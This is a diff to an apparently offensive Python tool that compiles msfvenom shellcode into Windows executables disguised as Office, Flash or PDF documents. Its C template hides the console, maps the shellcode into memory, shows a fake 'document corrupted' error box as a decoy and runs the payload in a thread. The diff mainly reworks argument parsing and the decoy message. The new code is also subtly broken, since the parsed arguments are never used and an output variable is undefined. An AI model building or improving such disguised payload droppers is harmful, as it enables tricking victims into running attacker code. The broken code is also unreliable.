@@ -18,6 +18,7 @@ import random
 import tempfile
 import os
 import subprocess
+import argparse
 
 HOME = os.getenv( "HOME" )
 MINGW_BIN = HOME + "/.wine/drive_c/MinGW/bin"
@@ -145,13 +146,13 @@ def generate_code_file(fd, key):
           DWORD lpflOldProtect;
           len = sizeof(buf);
           HANDLE hdlThread;
-          
-#ifndef DEBUG 
+
+#ifndef DEBUG
           FreeConsole();
 #endif
           code = AllocAndMap(NULL, buf, len);
           if (!code) return -1;
-          
+
 #ifdef DEBUG
           printf("[+] Shellcode alloc-ed at %p\\n", code);
 #endif
@@ -176,7 +177,7 @@ def generate_code_file(fd, key):
           MessageBoxA(NULL,
                       "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
                       "If this happened for the first time, you can try re-opening the document.",
-                      "Windows Error",
+                      "Windows Error.\\nError code: 0xffffff96",
                       MB_ICONERROR | MB_OK);
           hdlThread = CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID);
 
@@ -192,18 +193,18 @@ if __name__ == "__main__":
         profile_name = None
 	res_o = ""
         quiet_mode = False
+        available_profiles = ("powerpoint", "excel", "word", "flash", "pdf")
 
-        if len(sys.argv) not in xrange(4):
-                print("Syntax: msfvenom -f raw [...] | python {} [-p|--powerpoint][-x|--excel] [-w|--word] [-f|--flash]".format(sys.argv[0]))
+        parser = argparse.ArgumentParser(description=__doc__)
+        parser.add_argument("-p", "--profile", dest="profile_name", default=None,
+                            metavar="PROFILE", help="Specify the profile to use ({})".format(available_profiles))
+        parser.add_argument("-q", "--quiet", dest="quiet_mode", action="store_true", help="Disable verbose output")
+        parser.add_argument("-o", "--output", default=None, help="Specify an output file")
+        args = parser.parse_args()
+
+        if profile_name is not None and profile_name not in available_profiles:
+                print("[-] Invalid profile")
                 exit(1)
-
-	for opt in sys.argv[1:]:
-                if   opt in ("-p", "--powerpoint"):  profile_name = "powerpoint"
-		elif opt in ("-w", "--word"):        profile_name = "word"
-		elif opt in ("-x", "--excel"):       profile_name = "excel"
-		elif opt in ("-f", "--flash"):       profile_name = "flash"
-		elif opt in ("-d", "--pdf"):         profile_name = "pdf"
-                elif opt in ("-q", "--quiet"):       quiet_mode = True
 
         if not quiet_mode:
                 if profile_name is None:
@@ -226,7 +227,13 @@ if __name__ == "__main__":
 		os.unlink(resfile)
 
 	suffix = PROFILES[ profile_name ][7] if profile_name is not None else ""
-        f, ename = tempfile.mkstemp(suffix=suffix + ".exe")
+
+        if output is None:
+                f, ename = tempfile.mkstemp(suffix=suffix + ".exe")
+        else:
+                f, ename = open(output, "wb"), output
+
+        f.close()
         cmd = "cd {} && wine ./gcc.exe {} {} -o {}".format(MINGW_BIN, cname, res_o, ename)
         if not quiet_mode: print("[+] Compiling '{}'->'{}'".format(cname, ename))
         ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
